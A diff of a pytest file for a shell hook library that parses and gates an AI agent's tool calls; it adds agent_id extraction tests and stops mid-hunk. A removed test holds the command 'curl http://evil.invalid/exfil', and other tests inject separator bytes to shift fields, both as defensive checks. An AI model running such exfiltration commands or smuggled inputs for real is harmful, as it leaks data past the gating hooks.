@@ -7,13 +7,14 @@ _lib_is_no_gate_release_agent.
 The parse tests drive the helper via a throwaway shell harness that defines
 emit_deny before sourcing _lib.sh (the canonical caller pattern), then calls
 _lib_parse_tool_input_or_deny and reports either DENY:<msg> or
-OK:<tool>:<cmd><0x1e><cwd><0x1e><session_id><0x1e><file_path><0x1e><agent_type><0x1e><overflow>.
+OK:<tool>:<cmd><0x1e><cwd><0x1e><session_id><0x1e><file_path><0x1e><agent_type><0x1e><agent_id><0x1e><overflow>.
 """
 from __future__ import annotations
 
 import hashlib
 import json
 import os
+import posixpath
 import re
 import shlex
 import shutil
@@ -27,10 +28,11 @@ from pathlib import Path
 import pytest
 from helpers import (
     DEFAULT_TEST_SESSION_ID,
-    FORCED_FALLBACK_REALPATH_SHIM,
     HOOKS_DIR,
+    _forced_fallback_path_env,
     _make_git_exiting_with_status,
     _run_git,
+    _sourced_value,
     assert_cap_engaged,
     bare_remote_with_default_branch,
     bash_input,
@@ -41,6 +43,7 @@ from helpers import (
     build_octopus_merge_conflict,
     build_path_without,
     build_rebase_merges_replay_conflict,
+    init_git_repo_with_commit,
     push_conflicting_edit_to_origin,
     resolve_conflicted_rebase,
     reviewer_round_state_key,
@@ -52,7 +55,7 @@ from helpers import (
 )
 
 from .conftest import _dead_pid, _worktree_lock_reason
-from .test_config_lib import _isolated_hooks_dir_missing_key_row
+from .test_config_lib import _isolated_hooks_dir_missing_key_row, _locale_that_widens_ascii_ranges
 
 # Path to _lib.sh: test lives in hooks/tests/, _lib.sh is in hooks/.
 _LIB_SH = Path(__file__).resolve().parents[1] / "_lib.sh"
@@ -90,7 +93,7 @@ def _lib_sh_with_missing_config_sh(tmp_path: Path) -> Path:
 
 # Shell harness: define emit_deny BEFORE sourcing _lib.sh (canonical pattern),
 # call the helper, then print OK:<TOOL_NAME>:<COMMAND> on success, followed by
-# the four newly-folded fields and the field-shift overflow variable, each
+# the remaining extracted fields and the field-shift overflow variable, each
 # separated by 0x1e (a delimiter distinct from the parser's own 0x1f, so
 # neither can be mistaken for the other). The "OK:<TOOL_NAME>:<COMMAND>"
 # prefix is kept exactly as before so existing startswith() assertions
@@ -100,8 +103,8 @@ _HARNESS_TEMPLATE = (
     'emit_deny() {{ printf "DENY:%s\\n" "$1"; exit 0; }}; '
     ". {lib}; "
     '_lib_parse_tool_input_or_deny "test-msg"; '
-    'printf "OK:%s:%s\\x1e%s\\x1e%s\\x1e%s\\x1e%s\\x1e%s\\n" '
-    '"$TOOL_NAME" "$COMMAND" "$CWD" "$SESSION_ID" "$FILE_PATH" "$AGENT_TYPE" "$_lib_parse_overflow"'
+    'printf "OK:%s:%s\\x1e%s\\x1e%s\\x1e%s\\x1e%s\\x1e%s\\x1e%s\\n" '
+    '"$TOOL_NAME" "$COMMAND" "$CWD" "$SESSION_ID" "$FILE_PATH" "$AGENT_TYPE" "$AGENT_ID" "$_lib_parse_overflow"'
 )
 
 
@@ -118,7 +121,7 @@ def _run_harness(stdin_text: str, env: dict | None = None) -> subprocess.Complet
 
 
 def _parse_ok_fields(stdout: str) -> dict[str, str]:
-    """Split _HARNESS_TEMPLATE's OK line into its six extracted fields plus
+    """Split _HARNESS_TEMPLATE's OK line into its extracted fields plus
     the trailing field-shift overflow variable.
 
     `OK:<TOOL_NAME>:<COMMAND>` keeps the legacy colon-joined prefix intact
@@ -128,7 +131,7 @@ def _parse_ok_fields(stdout: str) -> dict[str, str]:
     """
     assert stdout.startswith("OK:"), repr(stdout)
     tool_name, _, remainder = stdout[len("OK:") :].partition(":")
-    command, cwd, session_id, file_path, agent_type, overflow = remainder.split("\x1e")
+    command, cwd, session_id, file_path, agent_type, agent_id, overflow = remainder.split("\x1e")
     return {
         "tool_name": tool_name,
         "command": command,
@@ -136,6 +139,7 @@ def _parse_ok_fields(stdout: str) -> dict[str, str]:
         "session_id": session_id,
         "file_path": file_path,
         "agent_type": agent_type,
+        "agent_id": agent_id,
         # printf's own trailing "\n" follows the overflow field; strip
         # exactly that one byte to recover the raw shell value.
         "overflow": overflow[:-1] if overflow.endswith("\n") else overflow,
@@ -221,15 +225,13 @@ def test_non_bash_tool_with_file_path_returns_ok_empty_command() -> None:
     assert result.stdout.startswith("OK:Edit:"), repr(result.stdout)
 
 
-# --- Six-field fold: .cwd, .session_id, .tool_input.file_path, .agent_type,
-# and the field-shift detector ---------------------------------------------
+# --- Folded-field extraction and the field-shift detector ---
 
 
-def test_six_field_payload_returns_all_fields_without_cross_contamination() -> None:
-    """All six fields extracted by the folded jq call land in their own
-    global with the exact payload value — the six-field analogue of
-    test_valid_bash_payload_returns_ok above. Every field is given a
-    distinct value so a field landing in the wrong global would be caught.
+def test_distinct_field_values_land_without_cross_contamination() -> None:
+    """Each payload value lands in its own global with the exact value. This is
+    the all-fields analogue of test_valid_bash_payload_returns_ok above.
+    Distinct values per field catch a value landing in the wrong global.
     """
     payload = json.dumps(
         {
@@ -238,6 +240,7 @@ def test_six_field_payload_returns_all_fields_without_cross_contamination() -> N
             "cwd": "/repo",
             "session_id": "sess-123",
             "agent_type": "main",
+            "agent_id": "agent-abc",
         }
     )
     result = _run_harness(payload)
@@ -249,6 +252,7 @@ def test_six_field_payload_returns_all_fields_without_cross_contamination() -> N
     assert fields["session_id"] == "sess-123"
     assert fields["file_path"] == "/tmp/f.txt"
     assert fields["agent_type"] == "main"
+    assert fields["agent_id"] == "agent-abc"
 
 
 @pytest.mark.parametrize(
@@ -257,20 +261,55 @@ def test_six_field_payload_returns_all_fields_without_cross_contamination() -> N
         (123, "123"),
         ({"nested": "x"}, '{"nested":"x"}'),
         ([1, 2], "[1,2]"),
+        (False, ""),
+        ("", ""),
     ],
 )
 def test_non_string_agent_type_stringifies_rather_than_erroring(agent_type_value, expected) -> None:
     """Pins _lib.sh's own comment claim: a non-string .agent_type silently
     stringifies via jq's \\(...) interpolation instead of raising a
-    structural-type error, so the six-field extraction still exits 0. Safe
-    for AGENT_TYPE specifically because both of its consumers
-    (_lib_is_review_only_agent, _lib_is_no_gate_release_agent) are
-    exact-match denylists that simply fail to match a garbled value."""
+    structural-type error, so the folded extraction still exits 0."""
     payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}, "agent_type": agent_type_value})
     result = _run_harness(payload)
     assert result.returncode == 0
     fields = _parse_ok_fields(result.stdout)
     assert fields["agent_type"] == expected
+
+
+@pytest.mark.parametrize(
+    "agent_id_value,expected",
+    [
+        (123, "123"),
+        ({"nested": "x"}, '{"nested":"x"}'),
+        ([1, 2], "[1,2]"),
+        (False, ""),
+        ("", ""),
+    ],
+)
+def test_non_string_agent_id_stringifies_rather_than_erroring(agent_id_value, expected) -> None:
+    """A non-string .agent_id stringifies the same way .agent_type does, so a
+    contract-violating value reads as non-empty rather than aborting the parse.
+    JSON false is the exception: jq's `//` replaces it, so it reads as absent,
+    and an empty string reads empty."""
+    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}, "agent_id": agent_id_value})
+    result = _run_harness(payload)
+    assert result.returncode == 0
+    fields = _parse_ok_fields(result.stdout)
+    assert fields["agent_id"] == expected
+
+
+def test_agent_type_and_agent_id_are_extracted_independently() -> None:
+    """A main session started with `--agent` carries agent_type alone, and a
+    subagent with no agent_type carries agent_id alone; neither value may
+    land in the other's global."""
+    type_only = _parse_ok_fields(
+        _run_harness(json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}, "agent_type": "x"})).stdout
+    )
+    id_only = _parse_ok_fields(
+        _run_harness(json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}, "agent_id": "y"})).stdout
+    )
+    assert (type_only["agent_type"], type_only["agent_id"]) == ("x", "")
+    assert (id_only["agent_type"], id_only["agent_id"]) == ("", "y")
 
 
 def test_multiline_command_round_trips_byte_for_byte() -> None:
@@ -286,10 +325,12 @@ def test_multiline_command_round_trips_byte_for_byte() -> None:
 
 
 def test_overflow_variable_holds_only_trailing_newline_for_well_formed_payload() -> None:
-    """The field-shift detector's invariant: a well-formed six-field
+    """The field-shift detector's invariant: a well-formed
     payload leaves the overflow variable holding exactly the herestring's
-    own trailing newline, AGENT_TYPE has no stray whitespace, and no deny
-    fires."""
+    own trailing newline, and no deny fires. AGENT_TYPE and AGENT_ID carry no
+    stray whitespace: the roster test matches AGENT_TYPE exactly, and the
+    engineer-row and ledger-state denies in enforce-marker-script-shape.sh
+    test AGENT_ID for emptiness."""
     payload = json.dumps(
         {
             "tool_name": "Bash",
@@ -297,6 +338,7 @@ def test_overflow_variable_holds_only_trailing_newline_for_well_formed_payload()
             "cwd": "/repo",
             "session_id": "sess-1",
             "agent_type": "main",
+            "agent_id": "agent-abc",
         }
     )
     result = _run_harness(payload)
@@ -304,13 +346,14 @@ def test_overflow_variable_holds_only_trailing_newline_for_well_formed_payload()
     fields = _parse_ok_fields(result.stdout)
     assert fields["overflow"] == "\n"
     assert not any(ch.isspace() for ch in fields["agent_type"])
+    assert not any(ch.isspace() for ch in fields["agent_id"])
 
 
 def test_overflow_variable_holds_only_trailing_newline_when_final_field_absent() -> None:
-    """.agent_type — the last of the six jq fields — entirely absent from
-    the payload (not merely empty) must not be mistaken for an overflow
-    condition: jq's `// ""` default still yields exactly six fields, so
-    dropping the trailing key doesn't drop a delimiter along with it."""
+    """Trailing jq fields entirely absent from the payload (not merely empty)
+    must not be mistaken for an overflow condition. The separators are
+    literals in the jq format string, so an absent key's `// ""` default
+    still yields an empty field and keeps every delimiter."""
     payload = json.dumps(
         {
             "tool_name": "Bash",
@@ -323,6 +366,7 @@ def test_overflow_variable_holds_only_trailing_newline_when_final_field_absent()
     assert result.returncode == 0
     fields = _parse_ok_fields(result.stdout)
     assert fields["agent_type"] == ""
+    assert fields["agent_id"] == ""
     assert fields["overflow"] == "\n"
 
 
@@ -380,6 +424,7 @@ _JQ_FIELD_TO_FLAT_KEY = {
     ".session_id": "session_id",
     ".tool_input.file_path": "file_path",
     ".agent_type": "agent_type",
+    ".agent_id": "agent_id",
 }
 
 _FIELD_SHIFT_DENY_MESSAGE = (
@@ -439,19 +484,20 @@ def _set_dotted_field(payload: dict, jq_field: str, value: str) -> dict:
     return payload
 
 
-def _base_six_field_payload() -> dict:
+def _base_full_payload() -> dict:
     return {
         "tool_name": "Bash",
         "tool_input": {"command": "ls -la", "file_path": "/tmp/f.txt"},
         "cwd": "/repo",
         "session_id": "sess-1",
         "agent_type": "main",
+        "agent_id": "agent-abc",
     }
 
 
 @pytest.mark.parametrize("jq_field", _JQ_FIELDS)
 def test_unit_separator_injected_into_any_field_denies_as_field_shift(jq_field: str) -> None:
-    """A 0x1f inside any one of the six extracted fields must deny with the
+    """A 0x1f inside any one extracted field must deny with the
     field-shift message rather than silently shifting every later field.
     The field-shift detector is a field-count property, not a per-field
     guard.
@@ -460,7 +506,7 @@ def test_unit_separator_injected_into_any_field_denies_as_field_shift(jq_field: 
     text, not harness-controlled, so it is the field an attacker can most
     directly shape.
     """
-    payload = _set_dotted_field(_base_six_field_payload(), jq_field, "va\x1flue")
+    payload = _set_dotted_field(_base_full_payload(), jq_field, "va\x1flue")
     result = _run_harness(json.dumps(payload))
     assert result.returncode == 0
     assert result.stdout.startswith("DENY:"), repr(result.stdout)
@@ -483,7 +529,7 @@ def test_newline_in_field_is_preserved_as_ordinary_data(jq_field: str) -> None:
     """A newline is legal data in a path or command and must not deny —
     paired with the 0x1f-injection test above so the field-shift boundary
     (0x1f specifically, not any control byte) is pinned from both sides."""
-    payload = _set_dotted_field(_base_six_field_payload(), jq_field, "va\nlue")
+    payload = _set_dotted_field(_base_full_payload(), jq_field, "va\nlue")
     result = _run_harness(json.dumps(payload))
     assert result.returncode == 0
     assert result.stdout.startswith("OK:"), repr(result.stdout)
@@ -1866,18 +1912,16 @@ def test_fragment_is_bare_env_assignment_false_for_non_assignment_or_mixed_fragm
 
 # --- _lib_split_fragments ---------------------------------------------------
 #
-# Backs every hook that fragment-walks a Bash command
-# (require-review-orchestrator-bash.sh, deny-reviewer-tree-mutation.sh, and
-# others). A standalone `&` (shell backgrounding) must split like
-# `;`/`&&`/`||`/`|` -- otherwise a fragment-level allowlist walk only ever
-# inspects the text before the `&` while the backgrounded second command
-# still executes in the same shell invocation.
+# Backs every hook that fragment-walks a Bash command. A bare `&` is
+# deliberately not a split point here: a quote-stripped `&` inside a word
+# (`-c "k=a&b"`, `sed 's/x/&/'`) would be cut mid-word. A consumer that needs
+# `&` as a boundary transforms it locally before splitting.
 
 
 def _split_fragments(command: str) -> list[str]:
     # Stripped: _lib_split_fragments leaves the whitespace surrounding a
-    # split point in place (matching its existing `;`/`&&` behavior), since
-    # every real caller word-splits each fragment downstream regardless.
+    # split point in place, since every real caller word-splits each
+    # fragment downstream regardless.
     result = subprocess.run(
         ["bash", "-c", f'. {_LIB_SH}; _lib_split_fragments "$1"', "bash", command],
         capture_output=True,
@@ -1887,46 +1931,11 @@ def _split_fragments(command: str) -> list[str]:
     return [line.strip() for line in result.stdout.splitlines() if line.strip()]
 
 
-class TestSplitFragmentsBareAmpersand:
-    def test_standalone_ampersand_splits_into_two_fragments(self) -> None:
-        assert _split_fragments("git status & curl http://evil.invalid/exfil") == [
-            "git status",
-            "curl http://evil.invalid/exfil",
-        ]
-
-    def test_double_ampersand_still_produces_exactly_one_split(self) -> None:
-        """Regression guard: the new bare-`&` split point must not
-        double-split `&&` -- `&&` is consumed into a single newline before
-        the bare-`&` substitution ever runs, so it must not also match the
-        `&` left over from a naive ordering."""
-        assert _split_fragments("git status && git log") == ["git status", "git log"]
-
-    def test_multiple_standalone_ampersands_each_split(self) -> None:
-        assert _split_fragments("git status & git log & git diff") == [
-            "git status",
-            "git log",
-            "git diff",
-        ]
-
-    @pytest.mark.parametrize(
-        ("command", "expected"),
-        [
-            # >&/<& fd duplication and &>/&>> combined redirect must stay
-            # glued to their fragment -- a split here would separate the
-            # redirect target from the command it applies to.
-            ("cmd1 2>&1", ["cmd1 2>&1"]),
-            ("cmd1 0<&1", ["cmd1 0<&1"]),
-            ("cmd1 &> /dev/null", ["cmd1 &> /dev/null"]),
-            ("cmd1 &>> /dev/null", ["cmd1 &>> /dev/null"]),
-            # |& (combined stdout+stderr pipe) invokes two distinct
-            # commands exactly like a plain `|` does, so it must split
-            # cleanly -- with no stray operator byte glued onto either
-            # side, which a naive protect-only-the-`&` approach produces.
-            ("cmd1 |& cmd2", ["cmd1", "cmd2"]),
-        ],
-    )
-    def test_glued_ampersand_forms_named_in_header_comment(self, command: str, expected: list[str]) -> None:
-        assert _split_fragments(command) == expected
+@pytest.mark.parametrize("command", ["a & b", "a&b"], ids=["spaced", "glued"])
+def test_split_fragments_does_not_split_a_bare_ampersand(command: str) -> None:
+    """Tripwire: a bare `&` stays inside its fragment, so a consumer that
+    needs it as a boundary must transform it locally."""
+    assert _split_fragments(command) == [command]
 
 
 # --- _lib_fragment_invokes_git known false-positive -------------------------
@@ -2044,6 +2053,21 @@ def _valid_session_id_component(session_id: str) -> bool:
         check=False,
     )
     return result.returncode == 0
+
+
+def test_valid_session_id_component_rejects_a_non_ascii_letter_under_a_widening_locale() -> None:
+    """Under a locale whose collation puts accented letters inside `[A-Za-z]`,
+    a bracket range accepts `sess<e-acute>`. The predicate spells its allowed
+    characters out, so a revert to a range fails here on any runner that has
+    such a locale."""
+    result = subprocess.run(
+        ["bash", "-c", f'. {_LIB_SH}; _lib_valid_session_id_component "$1"', "bash", "sess\u00e9"],
+        env={**os.environ, "LC_ALL": _locale_that_widens_ascii_ranges()},
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert result.returncode != 0
 
 
 @pytest.mark.parametrize(
@@ -2612,19 +2636,9 @@ def _first_live_linked_worktree(repo_root: Path) -> subprocess.CompletedProcess:
     )
 
 
-def _init_repo(path: Path) -> None:
-    path.mkdir(parents=True, exist_ok=True)
-    subprocess.run(["git", "init", "-q"], cwd=path, check=True)
-    subprocess.run(["git", "config", "user.email", "t@t.com"], cwd=path, check=True)
-    subprocess.run(["git", "config", "user.name", "t"], cwd=path, check=True)
-    (path / "f.txt").write_text("x\n")
-    subprocess.run(["git", "add", "f.txt"], cwd=path, check=True)
-    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=path, check=True)
-
-
 def test_first_live_linked_worktree_finds_a_present_worktree(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
-    _init_repo(repo)
+    init_git_repo_with_commit(repo)
     wt = tmp_path / "wt"
     subprocess.run(
         ["git", "worktree", "add", "-b", "feature", str(wt)], cwd=repo, check=True, capture_output=True
@@ -2641,7 +2655,7 @@ def test_first_live_linked_worktree_ignores_a_stale_unpruned_entry(tmp_path: Pat
     without `git worktree prune` or `git worktree remove`. That stale entry
     must not count as a live worktree."""
     repo = tmp_path / "repo"
-    _init_repo(repo)
+    init_git_repo_with_commit(repo)
     wt = tmp_path / "wt"
     subprocess.run(
         ["git", "worktree", "add", "-b", "feature", str(wt)], cwd=repo, check=True, capture_output=True
@@ -2658,7 +2672,7 @@ def test_first_live_linked_worktree_returns_not_found_with_no_worktree_at_all(
     tmp_path: Path,
 ) -> None:
     repo = tmp_path / "repo"
-    _init_repo(repo)
+    init_git_repo_with_commit(repo)
 
     result = _first_live_linked_worktree(repo)
 
@@ -2685,22 +2699,12 @@ def _resolve_default_branch(
     )
 
 
-def _init_repo_on_branch(path: Path, branch: str) -> None:
-    path.mkdir(parents=True, exist_ok=True)
-    subprocess.run(["git", "init", "-q", "-b", branch], cwd=path, check=True)
-    subprocess.run(["git", "config", "user.email", "t@t.com"], cwd=path, check=True)
-    subprocess.run(["git", "config", "user.name", "t"], cwd=path, check=True)
-    (path / "f.txt").write_text("x\n")
-    subprocess.run(["git", "add", "f.txt"], cwd=path, check=True)
-    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=path, check=True)
-
-
 def test_resolve_default_branch_via_symbolic_ref_for_non_main_name(tmp_path: Path) -> None:
     """A repo whose default branch is neither main/master/develop still
     resolves correctly via the direct origin/HEAD symbolic ref, without
     ever reaching the candidate-probe fallback."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "trunk")
+    init_git_repo_with_commit(repo, branch="trunk")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/trunk", "HEAD"], cwd=repo, check=True
     )
@@ -2723,7 +2727,7 @@ def test_resolve_default_branch_falls_back_to_candidate_probe_for_develop(
     landing on the first one (main, master, develop) with a matching
     origin/<candidate> ref."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "develop")
+    init_git_repo_with_commit(repo, branch="develop")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/develop", "HEAD"], cwd=repo, check=True
     )
@@ -2743,7 +2747,7 @@ def test_resolve_default_branch_candidate_probe_reads_remote_ref_not_local_branc
     reading the remote-tracking ref, not by reporting whatever branch
     happens to be checked out locally."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "feature")
+    init_git_repo_with_commit(repo, branch="feature")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/develop", "HEAD"], cwd=repo, check=True
     )
@@ -2759,7 +2763,7 @@ def test_resolve_default_branch_empty_when_unresolvable(tmp_path: Path) -> None:
     all (e.g. a repo with no configured remote) — the helper reports "could
     not resolve" as empty stdout and a non-zero exit rather than guessing."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
 
     result = _resolve_default_branch(repo)
 
@@ -2775,7 +2779,7 @@ def test_resolve_default_branch_empty_when_candidate_probe_finds_no_match(
     report unresolvable, with a non-zero exit, rather than matching trunk by
     some other means."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "trunk")
+    init_git_repo_with_commit(repo, branch="trunk")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/trunk", "HEAD"], cwd=repo, check=True
     )
@@ -2793,7 +2797,7 @@ def test_resolve_default_branch_symbolic_ref_preserves_slash_in_branch_name(
     unmangled -- the "refs/remotes/origin/" strip is a literal anchored
     prefix strip, not a strip of every slash in the string."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "release/v2")
+    init_git_repo_with_commit(repo, branch="release/v2")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/release/v2", "HEAD"], cwd=repo, check=True
     )
@@ -2815,7 +2819,7 @@ def test_resolve_default_branch_candidate_probe_prefers_earlier_candidate(
     origin/main) — the candidate loop returns master, the earlier-listed
     candidate in the main/master/develop order, not develop."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "master")
+    init_git_repo_with_commit(repo, branch="master")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/master", "HEAD"], cwd=repo, check=True
     )
@@ -2838,7 +2842,7 @@ def test_resolve_default_branch_candidate_probe_prefers_main_over_master(
     test_resolve_default_branch_candidate_probe_prefers_earlier_candidate
     covers."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/main", "HEAD"], cwd=repo, check=True
     )
@@ -2861,7 +2865,7 @@ def test_resolve_default_branch_symbolic_ref_with_dangling_target_is_rejected(
     target reports unresolvable, with a non-zero exit, exactly like any
     other unverified origin/HEAD (docs/design-decisions.md #54)."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     subprocess.run(
         ["git", "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"],
         cwd=repo, check=True,
@@ -2880,7 +2884,7 @@ def test_default_branch_from_origin_head_resolves_verified_target_in_isolation(
     guessing layer): a valid origin/HEAD symbolic ref pointing at a verified
     target resolves, with no candidate-probe fallback involved at all."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "trunk")
+    init_git_repo_with_commit(repo, branch="trunk")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/trunk", "HEAD"], cwd=repo, check=True
     )
@@ -2907,7 +2911,7 @@ def test_default_branch_from_origin_head_rejects_dangling_target_in_isolation(
     test_resolve_default_branch_symbolic_ref_with_dangling_target_is_rejected
     does."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     subprocess.run(
         ["git", "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"],
         cwd=repo, check=True,
@@ -2928,7 +2932,7 @@ def test_default_branch_or_guess_falls_through_on_dangling_origin_head_to_live_d
     _lib_default_branch_or_guess falls through to the candidate probe on the
     narrow layer's failure rather than returning empty outright."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "develop")
+    init_git_repo_with_commit(repo, branch="develop")
     subprocess.run(
         ["git", "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"],
         cwd=repo, check=True,
@@ -2996,7 +3000,7 @@ def test_verification_cache_sentinel_present_on_origin_default(tmp_path: Path) -
     """The positive case the opt-in gate depends on: the sentinel committed
     at origin/<default-branch> reads present."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     _commit_sentinel_at_ref(repo, "refs/remotes/origin/main")
     subprocess.run(
         ["git", "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"],
@@ -3012,7 +3016,7 @@ def test_verification_cache_sentinel_absent_from_origin_default(tmp_path: Path) 
     """origin/<default-branch> exists and resolves, but the sentinel was
     never committed to it -- the default-off gate's ordinary state."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/main", "HEAD"], cwd=repo, check=True
     )
@@ -3032,7 +3036,7 @@ def test_verification_cache_sentinel_absent_when_origin_head_unset(tmp_path: Pat
     _lib_default_branch_from_origin_head's own two-outcome contract rather
     than falling back to guessing a branch name."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     _commit_sentinel_at_ref(repo, "refs/remotes/origin/main")
 
     result = _sentinel_present(repo)
@@ -3047,7 +3051,7 @@ def test_verification_cache_sentinel_present_only_on_non_default_branch_reads_ab
     origin/main, which lacks it -- presence on a non-default branch must not
     count as opted in."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     subprocess.run(
         ["git", "update-ref", "refs/remotes/origin/main", "HEAD"], cwd=repo, check=True
     )
@@ -3101,7 +3105,7 @@ def test_verification_cache_sentinel_present_when_path_is_a_tree(tmp_path: Path)
     an object exists at the sentinel path but not its type, so a tree
     (directory) committed there reads as present identically to a blob."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     _commit_sentinel_tree_at_ref(repo, "refs/remotes/origin/main")
     subprocess.run(
         ["git", "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"],
@@ -3136,7 +3140,7 @@ def test_head_tree_hash_capped_matches_git_rev_parse(tmp_path: Path) -> None:
     """The capped path's stdout is exactly `git rev-parse HEAD^{tree}` --
     write and check's shared recipe depends on this matching bit-for-bit."""
     repo = tmp_path / "repo"
-    _init_repo(repo)
+    init_git_repo_with_commit(repo)
     expected = subprocess.run(
         ["git", "rev-parse", "HEAD^{tree}"], cwd=repo,
         capture_output=True, text=True, check=True,
@@ -3152,7 +3156,7 @@ def test_head_tree_hash_uncapped_matches_git_rev_parse(tmp_path: Path) -> None:
     """Same recipe as the capped case, run through the uncapped branch --
     both cap_mode arguments must compute the identical hash."""
     repo = tmp_path / "repo"
-    _init_repo(repo)
+    init_git_repo_with_commit(repo)
     expected = subprocess.run(
         ["git", "rev-parse", "HEAD^{tree}"], cwd=repo,
         capture_output=True, text=True, check=True,
@@ -3183,7 +3187,7 @@ def test_head_tree_hash_invalid_cap_mode_exits_2_with_message(tmp_path: Path) ->
     it exits 2 (distinct from the 1 a resolvable-but-absent HEAD returns) and
     names the bad value in its stderr message."""
     repo = tmp_path / "repo"
-    _init_repo(repo)
+    init_git_repo_with_commit(repo)
 
     result = _head_tree_hash_result(repo, "sideways")
 
@@ -3200,7 +3204,7 @@ def test_head_tree_hash_capped_timeout_returns_absent_not_a_hang(tmp_path: Path)
     the 5s _lib_capped cap, and a killed call must fall through to the same
     absent outcome a commit-less repo gets, never a false hash."""
     repo = tmp_path / "repo"
-    _init_repo(repo)
+    init_git_repo_with_commit(repo)
     real_git = shutil.which("git")
     if not real_git:
         pytest.skip("git not found in PATH")
@@ -3779,6 +3783,26 @@ class TestCommandInvokesGitSubcmd:
     def test_empty_command_does_not_match(self) -> None:
         assert _command_invokes_git_subcmd("", "commit") == 1
 
+    def test_global_dash_c_flag_prefix_still_matches(self) -> None:
+        """A `-c key=val` global flag ahead of the subcommand must not hide
+        it: the word-walk skips the flag and its value."""
+        assert _command_invokes_git_subcmd("git -c core.editor=true commit", "commit") == 0
+
+    def test_global_dash_cap_c_flag_prefix_still_matches(self) -> None:
+        """A `-C <path>` global flag ahead of the subcommand must not hide
+        it, same rationale as the `-c` case above."""
+        assert _command_invokes_git_subcmd("git -C /tmp commit -m x", "commit") == 0
+
+    def test_continue_form_does_not_match_commit(self) -> None:
+        """`git merge --continue`'s subcommand genuinely is `merge`, not
+        `commit` -- this predicate correctly says no, which is why
+        _lib_command_concludes_commit is a separate predicate from this
+        one."""
+        assert _command_invokes_git_subcmd("git merge --continue", "commit") == 1
+
+    def test_rebase_continue_form_does_not_match_commit(self) -> None:
+        assert _command_invokes_git_subcmd("git rebase --continue", "commit") == 1
+
     def test_wrong_arity_returns_could_not_determine(self) -> None:
         result = subprocess.run(
             ["bash", "-c", f'. {_LIB_SH}; _lib_command_invokes_git_subcmd "git commit"'],
@@ -4150,19 +4174,24 @@ def test_gh_help_root_no_value_placeholder_flags_stay_within_help_and_version() 
 # the real system realpath otherwise) plus /usr/bin:/bin only, deliberately
 # excluding /usr/local/bin, where this dev machine's Homebrew `grealpath`
 # actually lives. Without this, `command -v grealpath` would still find it
-# and the fallback branch under test would never run.
+# and the fallback branch under test would never run. The shim itself is
+# `helpers._FORCED_FALLBACK_REALPATH_SHIM`, shared with
+# test_ask_review_permissions.py, which forces the same fast-path failure
+# for the same reason.
+
+
+_REALPATH_M_FALLBACK_MAX_DEPTH = int(_sourced_value("_LIB_REALPATH_M_FALLBACK_MAX_DEPTH"))
+assert _REALPATH_M_FALLBACK_MAX_DEPTH >= 2, (
+    "exact-boundary tests below compute dirs = _REALPATH_M_FALLBACK_MAX_DEPTH - 2 and - 1; "
+    "a cap below 2 degenerates those to trivial near-zero-depth cases"
+)
 
 
 def _run_realpath_m(target: str, forced_fallback: bool = False, tmp_path: Path | None = None) -> subprocess.CompletedProcess:
     env = dict(os.environ)
     if forced_fallback:
         assert tmp_path is not None, "forced_fallback requires tmp_path"
-        shim_dir = tmp_path / "realpath_shim"
-        shim_dir.mkdir(exist_ok=True)
-        shim = shim_dir / "realpath"
-        shim.write_text(FORCED_FALLBACK_REALPATH_SHIM)
-        shim.chmod(0o755)
-        env["PATH"] = f"{shim_dir}:/usr/bin:/bin"
+        env["PATH"] = _forced_fallback_path_env(tmp_path)
     script = f'set -uo pipefail; . {_LIB_SH}; _lib_realpath_m "$1"'
     return subprocess.run(
         ["bash", "-c", script, "bash", target],
@@ -4170,7 +4199,180 @@ def _run_realpath_m(target: str, forced_fallback: bool = False, tmp_path: Path |
         text=True,
         env=env,
         check=False,
+        # A regressed `|| return 1` on a capped call inside the fallback
+        # loop's `while true` retries forever against an always-hanging
